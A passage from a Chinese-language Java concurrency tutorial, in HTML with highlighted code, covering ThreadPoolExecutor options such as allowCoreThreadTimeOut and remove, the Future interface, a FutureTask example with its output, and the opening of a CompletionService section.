        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> myThreadFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myThreadFactory<span class="token punctuation">.</span><span class="token function">getFailed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> e<span class="token punctuation">.</span><span class="token function">getThrowable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="允许回收执行线程：allowCoreThreadTimeOut">允许回收执行线程：allowCoreThreadTimeOut</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> allowCoreThreadTimeOut<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AllowCoreThreadTimeOutTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ThreadPoolExecutor</span> executorService <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">)</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">setKeepAliveTime</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">allowCoreThreadTimeOut</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

# <span class="token number">10</span>秒后线程池被销毁，测试进程退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AllowCoreThreadTimeOutTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ThreadPoolExecutor</span> executorService <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">)</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">setKeepAliveTime</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">allowCoreThreadTimeOut</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

# 测试进程无法退出，executorService保有<span class="token number">2</span>个活跃的执行线程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="删除任务：remove">删除任务：remove</h3>
<p>适用于<code>executorService.execute(e) </code>提交的任务，而<code>executorService.submit(e)</code> 提交的任务，无法移除。submit 提交的任务</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RemoveTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ThreadPoolExecutor</span> executorService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">ArrayBlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">&gt;</span></span> runnableList <span class="token operator">=</span> <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token punctuation">(</span><span class="token class-name">Runnable</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"task:"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" with "</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        runnableList<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">boolean</span> result <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>runnableList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"remove result : "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="prestartCoreThread-：-启动一个执行线程">prestartCoreThread ： 启动一个执行线程</h3>
<h3 id="prestartAllCoreThreads：启动所有执行线程">prestartAllCoreThreads：启动所有执行线程</h3>
<h3 id="beforeExecute-afterExecute">beforeExecute/afterExecute</h3>
<p>自定义ThreadPoolExecutor的子类，覆写。</p>
<h2 id="Future与FutureTask">Future与FutureTask</h2>
<h3 id="Future-接口">Future 接口</h3>
<table>
<thead>
<tr>
<th>接口方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>V get() throws InterruptedException, ExecutionException;</td>
</tr>
<tr>
<td>V get(long timeout, TimeUnit unit)     throws InterruptedException, ExecutionException, TimeoutException;</td>
</tr>
<tr>
<td>boolean isDone();</td>
</tr>
<tr>
<td>boolean cancel(boolean mayInterruptIfRunning);</td>
</tr>
<tr>
<td>boolean isCancelled();</td>
</tr>
</tbody>
</table>
<ul>
<li><code>cancel</code>：取消任务，如果取消任务成功则返回true，如果取消任务失败则返回false。参数<code>mayInterruptIfRunning</code>表示是否允许取消正在执行却没有执行完毕的任务：
<ol>
<li>如果设置true，则表示可以取消正在执行过程中的任务</li>
<li>如果任务已经完成，则无论mayInterruptIfRunning为true还是false，此方法肯定返回false</li>
<li>如果任务正在执行，若mayInterruptIfRunning设置为true，则返回true，若mayInterruptIfRunning设置为false，则返回false</li>
<li>如果任务还没有执行，则无论mayInterruptIfRunning为true还是false，肯定返回true</li>
</ol>
</li>
<li><code>isCancelled</code>：方法表示任务是否被取消成功，如果在任务正常完成前被取消成功，则返回 true</li>
<li><code>isDone</code>：判断任务是否已经完成，已完成则返回true；</li>
<li><code>get()</code>：获取执行结果，这个方法会产生阻塞，会一直等到任务执行完毕才返回；</li>
<li><code> get(long timeout, TimeUnit unit)</code>：用来获取执行结果，如果在指定时间内，还没获取到结果，就直接返回null</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Future</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * boolean cancel(boolean mayInterruptIfRunning);
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newSingleThreadExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token string">"done"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">cancel</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"all done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="FutureTask类">FutureTask类</h3>
<p>FutureTask类实现了RunnableFuture接口，RunnableFuture接口又继承了Runable和Future，可见，FutureTask既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值。</p>
<p>FutureTask类图如下</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/1620-1667231117133-93.png" alt="img"></p>
<p>FutureTask两个构造函数：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">FutureTask</span><span class="token punctuation">(</span><span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> callable<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">FutureTask</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> runnable<span class="token punctuation">,</span> <span class="token class-name">V</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>使用FutureTask来实现Future多线程获取任务结果的场景</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureTaskTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executor <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> callable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Task</span><span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">MyFutureTask</span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyFutureTask</span><span class="token punctuation">(</span>callable<span class="token punctuation">)</span><span class="token punctuation">;</span>
            executor<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        executor<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">MyFutureTask</span> <span class="token keyword">extends</span> <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">MyFutureTask</span><span class="token punctuation">(</span><span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> callable<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>callable<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"完成："</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> <span class="token operator">|</span> <span class="token class-name">ExecutionException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Task</span> <span class="token keyword">implements</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> time<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">Task</span><span class="token punctuation">(</span><span class="token keyword">int</span> time<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>time <span class="token operator">=</span> time<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"启动："</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span>启动：Fri Nov <span class="token number">08</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">26</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">3</span>启动：Fri Nov <span class="token number">08</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">26</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span>启动：Fri Nov <span class="token number">08</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">26</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">3</span>完成：Fri Nov <span class="token number">08</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">32</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span>完成：Fri Nov <span class="token number">08</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">33</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span>完成：Fri Nov <span class="token number">08</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">34</span> <span class="token constant">CST</span> <span class="token number">2019</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="CompletionService接口">CompletionService接口</h2>
<p>我们知道，通过 Future 和 FutureTask 可以获得线程任务的执行结果，但它们有一定的缺陷：</p>
<ul>
<li>Future：多个线程任务的执行结果，我们可以通过轮询的方式去获取，但普通轮询会有被阻塞的可能，升级轮询会非常消耗cpu</li>
<li>FutureTask：虽然我们可以调用 done 方法，在线程任务执行结束后立即返回或做其他处理，但对批量线程任务结果的管理方面有所不足</li>
</ul>
<p>为了更好地应对大量线程任务结果处理的问题，JDK提供了功能强大的 CompletionService。CompletionService是一个接口，使用创建时提供的 Executor 对象（通常是线程池）来执行任务，并在内部维护了一个阻塞队列<code>QueueingFuture</code>，当任务执行结束就把任务的执行结果的<code>Future</code>对象加入到阻塞队列中。</p>
<p>该接口只有一个实现类： <code>ExecutorCompletionService</code></p>
<blockquote>
<p>ExecutorCompletionService  的构造函数</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * Creates an ExecutorCompletionService using the supplied
 * executor for base task execution and a
 * {@link LinkedBlockingQueue} as a completion queue.
 *
 * @param executor the executor to use
 * @throws NullPointerException if executor is {@code null}
 */</span>
<span class="token keyword">public</span> <span class="token class-name">ExecutorCompletionService</span><span class="token punctuation">(</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
